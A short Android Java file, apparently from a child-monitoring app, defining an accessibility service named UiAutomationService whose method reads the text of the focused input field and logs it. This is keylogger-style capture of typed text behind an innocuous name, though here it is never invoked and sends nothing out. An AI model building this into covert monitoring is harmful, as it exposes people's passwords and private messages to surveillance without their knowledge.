package com.kidsguard.child;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
public class UiAutomationService extends AccessibilityService {
    public void extractInput() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focus != null && focus.getText() != null) {
            processText(focus.getText().toString());
        }
        root.recycle();
    }
    private void processText(String t) { Log.d("UiAuto", t); }
    @Override public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent e) {}
    @Override public void onInterrupt() {}
}
